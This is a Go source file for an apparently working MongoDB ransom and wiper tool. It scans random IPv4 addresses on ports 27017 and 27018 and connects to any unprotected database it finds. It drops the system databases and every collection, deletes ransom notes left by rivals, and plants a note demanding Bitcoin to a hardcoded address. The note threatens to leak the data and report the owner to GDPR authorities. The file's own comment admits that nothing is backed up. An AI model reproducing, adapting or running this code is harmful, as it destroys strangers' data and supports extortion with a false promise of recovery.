package main

import (
	"context"
	"fmt"
	"github.com/google/uuid"
	"github.com/icrowley/fake"
	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/mongo"
	"go.mongodb.org/mongo-driver/mongo/options"
	"go.mongodb.org/mongo-driver/mongo/readpref"
	"time"
)

/*
THIS WILL BACKUP NOTHING !!!
It's only delete all collections and ask for a ransom.
*/

var btc_add = "bc1qutldhsc6872gwpp4g34yjk83nv8mkykem3xl6k" // Your btc address
var email = "whatever@secmail.com"                         // Your email
var ports = []string{"27017", "27018"}

type ransom struct {
	Email      string
	Ransome_id string
	BTC_addr   string
	Message    string
}

func MainLoop(ip string, port string) {
	clientOptions := options.Client().ApplyURI("mongodb://" + ip + ":" + port)
	client, err := mongo.Connect(context.TODO(), clientOptions)
	if err != nil {
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), 6*time.Second)
	defer cancel()
	err = client.Ping(ctx, readpref.Primary())
	if err != nil {
		fmt.Println("\033[31m[!] No connection\033[0m")
		return
	}
	ransom_id := uuid.New().String()
	dbs, _ := client.ListDatabaseNames(context.TODO(), bson.D{{}})
	for _, db := range dbs {
		switch db {
		case
			"admin",
			"local",
			"config":
			client.Database(db).Drop(context.TODO())
			fmt.Println("\033[33mDropped:", db, "\033[0m")
			continue
		}
		col, _ := client.Database(db).ListCollectionNames(context.TODO(), bson.D{{}})
		var wasitme bool
		for _, colname := range col {
			if colname == "READ_ME_TO_RECOVER_YOUR_DATA" {
				wasitme = CheckIfWasMe(client, db, colname)
				if wasitme == false {
					fmt.Println("\033[36mFuck others\033[0m")
					client.Database(db).Collection(colname).Drop(context.TODO())
				} else {
					fmt.Println("\033[36mAlrady encrypted\033[0m")
					continue
				}
			}
			DeleteCol(client, db, colname)
		}
		if wasitme != true {
			RansomNote(client, db, ransom_id)
		}
	}
	client.Disconnect(context.TODO())
}

func CheckIfWasMe(client *mongo.Client, db string, colname string) bool {
	opts := options.FindOne().SetSort(bson.D{{"btc_addr", 1}})
	var result bson.M
	err := client.Database(db).Collection(colname).FindOne(context.TODO(),
		bson.D{{"btc_addr", btc_add}}, opts).Decode(&result)
	if err == mongo.ErrNoDocuments {
		return false
	}
	return true
}

func DeleteCol(client *mongo.Client, db string, colname string) {
	client.Database(db).Collection(colname).Drop(context.TODO())
	fmt.Println("\033[33m[Deleted: " + db + " ─> " + colname + "]\033[0m")
}

func RansomNote(client *mongo.Client, db string, ransom_id string) {
	message := "All your data is a backed up. You must pay 0.03 BTC to " + btc_add +
		" in 48 hours for recover it. After 48 hours expiration we will leaked and exposed all " +
		"your data. In case of refusal to pay, we will contact the General Data Protection " +
		"Regulation, GDPR and notify them that you store user data in an open form and is " +
		"not safe. Under the rules of the law, you face a heavy fine or arrest and your base " +
		"dump will be dropped from our server! You can buy bitcoin here, does not take much " +
		"time to buy https://localbitcoins.com with this guide " +
		"https://localbitcoins.com/guides/how-to-buy-bitcoins After paying write to me in the " +
		"mail with your ransom id (" + ransom_id + ") at:" + email + " and you will receive " +
		"a link to download your database dump."
	client.Database(db).Collection("READ_ME_TO_RECOVER_YOUR_DATA").InsertOne(context.TODO(), ransom{email, ransom_id, btc_add, message})
	fmt.Println("\033[32m[$] Insert Ransom ──>", db, "\033[0m")
}

func main() {
	for true {
		for _, port := range ports {
			ip := fake.IPv4()
			fmt.Println("\033[1;37m"+ip+":"+port, "\033[0m")
			MainLoop(ip, port)
		}
	}
}
